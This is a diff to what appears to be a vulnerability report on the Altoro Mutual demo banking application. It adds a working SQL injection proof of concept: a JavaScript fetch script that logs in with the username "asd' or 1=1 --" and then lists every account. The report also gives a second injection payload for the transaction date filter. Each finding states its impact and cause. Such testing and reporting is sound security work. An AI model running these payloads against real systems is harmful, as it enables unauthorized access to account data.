@@ -35,6 +35,35 @@ Report content:
   - cause: DBUtil.isValidUser() method does string concatenation in SQL query
 
 - SQL injection
+  - Run the following script, and observe how all the bank accounts on the system are returned
+      username = "asd' or 1=1 --";
+      password = 'asd';
+      res = await (
+        await fetch('/altoromutual/api/login', {
+          headers: { 'Content-Type': 'application/json' },
+          method: 'POST',
+          body: JSON.stringify({
+            username,
+            password
+          })
+        })
+      ).json();
+
+      auth = res.Authorization;
+
+      await (
+        await fetch('/altoromutual/api/account', {
+          headers: { Authorization: auth }
+        })
+      ).json();
+  - Impact: a user can list all of the accounts on the system
+  - cause:
+    - DBUtil.getUserInfo() method does string concatenation in SQL query
+      - first user returned, but with username the same as the one sent in the parameter
+    - DBUtil.getAccounts() method does string concatenation in SQL query
+      - username returned above is used and the query is injected
+
+- SQL injection
   - Modify the POST request of of filtered showTransactions
     to: startDate=2018-06-11&endDate=2018-06-11 23:59:59') OR 1=1 --
     - Or run this in console: Form1.onsubmit = undefined and enter the above start date and end date
